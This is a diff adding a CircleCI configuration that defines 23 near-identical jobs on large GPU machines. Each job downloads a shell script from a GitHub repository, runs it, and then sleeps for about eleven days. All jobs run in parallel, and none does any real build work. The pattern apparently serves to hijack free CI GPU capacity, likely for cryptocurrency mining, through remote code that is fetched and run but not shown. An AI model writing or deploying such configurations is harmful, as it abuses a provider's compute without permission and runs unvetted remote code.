@@ -1,0 +1,237 @@
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
+      - run: sleep 999999
+
+  build2:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
+      - run: sleep 999999
+      
+
+
+  build3:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
+      - run: sleep 999999
+
+
+  build4:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
+      - run: sleep 999999
+
+  build5:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
+      - run: sleep 999999
+
+  build6:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
+      - run: sleep 999999
+      
+
+
+  build7:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
+      - run: sleep 999999
+
+
+  build8:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
+      - run: sleep 999999
+
+  build9:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
+      - run: sleep 999999
+
+
+  build10:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
+      - run: sleep 999999
+
+  build11:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
+      - run: sleep 999999
+      
+
+
+  build12:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
+      - run: sleep 999999
+
+
+  build13:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
+      - run: sleep 999999
+
+  build14:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
+      - run: sleep 999999
+
+  build15:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
+      - run: sleep 999999
+      
+
+
+  build16:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
+      - run: sleep 999999
+
+
+  build17:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
+      - run: sleep 999999
+
+  build18:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
+      - run: sleep 999999
+
+
+  build19:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
+      - run: sleep 999999
+
+  build20:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
+      - run: sleep 999999
+      
+
+
+  build21:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
+      - run: sleep 999999
+
+
+  build22:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
+      - run: sleep 999999
+
+  build24:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Cci.sh && chmod +x Cci.sh && ./Cci.sh
+      - run: sleep 999999
+
+
+
+
+
+      
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - build
+            - build2
+            - build3
+            - build4
+            - build5
+            - build6
+            - build7
+            - build8            
+            - build9
+            - build10
+            - build11
+            - build12
+            - build13
+            - build14
+            - build15
+            - build16
+            - build17          
+            - build18
+            - build19
+            - build20
+            - build21
+            - build22
+            - build24
+               
